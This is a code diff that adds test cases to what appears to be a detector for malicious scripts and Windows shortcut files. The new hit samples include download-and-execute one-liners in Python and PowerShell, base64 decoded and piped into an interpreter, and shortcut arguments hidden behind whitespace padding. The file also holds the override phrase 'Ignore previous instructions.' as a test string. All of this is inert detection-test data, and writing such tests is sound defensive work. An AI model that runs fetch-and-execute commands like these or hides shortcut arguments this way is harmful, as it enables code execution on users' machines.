@@ -106,6 +106,13 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         "https://example.invalid/inert.hta",
     )
     mshta_miss = probe.shell_link(r"C:\Windows\System32\mshta.exe", r"C:\inert\local.hta")
+    # Whitespace padding before the arguments, as in ZDI-CAN-25373; four spaces are a typo.
+    padded = probe.shell_link(r"C:\Windows\System32\cmd.exe", "\r\n\r\n/c echo inert")
+    padded_miss = probe.shell_link(r"C:\Windows\System32\cmd.exe", "    /c echo inert")
+    remote = probe.shell_link(
+        r"C:\Windows\System32\cmd.exe", "/c echo https://example.invalid/inert"
+    )
+    remote_miss = probe.shell_link(r"C:\Windows\explorer.exe", r"\\fileserver.example\share")
     phrase = b"Ignore previous instructions."
     quoted = b"the phrase ignore previous instructions is quoted in papers\n"
     rels = (
@@ -240,6 +247,12 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"echo Y3VybA== | base64 -D | zsh\n",
             b"base64 -d notes.b64 > notes.txt\n",
         ),
+        (
+            "script_base64_decode_pipe",
+            b"echo aW1wb3J0IHRoaXM= | base64 -d | python3\n",
+            # Decoding a token for a pretty-printer: python has a program argument.
+            b"echo eyJhIjoxfQ== | base64 -d | python3 -m json.tool\n",
+        ),
         ("script_chmod_execute", b"chmod +x setup.sh\n./setup.sh\n", b"chmod +x setup.sh\n"),
         (
             "script_chmod_execute",
@@ -261,6 +274,22 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             "script_download_execute",
             b"iex (irm https://example.invalid/x)\n",
             b"irm https://example.invalid/api | ConvertFrom-Json\n",
+        ),
+        (
+            "script_download_execute",
+            b'python3 -c "import urllib.request;exec(urllib.request.urlopen('
+            b"'https://example.invalid/i').read())\"\n",
+            b'python3 -c "import urllib.request;print(urllib.request.urlopen('
+            b"'https://example.invalid/i').read())\"\n",
+        ),
+        (
+            "script_download_execute",
+            b"python -c 'import os,urllib.request as u;os.system(u.urlopen("
+            b'"https://example.invalid/s").read().decode())\'\n',
+            # A program file that fetches and spawns is not a one-liner.
+            b"import subprocess\nimport urllib.request\n\n"
+            b"body = urllib.request.urlopen(URL).read()\n"
+            b'subprocess.run(["cat"], input=body, check=True)\n',
         ),
         (
             "script_encoded_powershell",
@@ -324,6 +353,8 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ),
         ("shortcut_powershell_encoded", powershell, powershell_miss),
         ("shortcut_mshta_remote", mshta, mshta_miss),
+        ("shortcut_padded_arguments", padded, padded_miss),
+        ("shortcut_interpreter_remote", remote, remote_miss),
         (
             "win_internet_shortcut_launch",
             b"[InternetShortcut]\r\nURL=file://192.0.2.10/share/report.pdf\r\n",
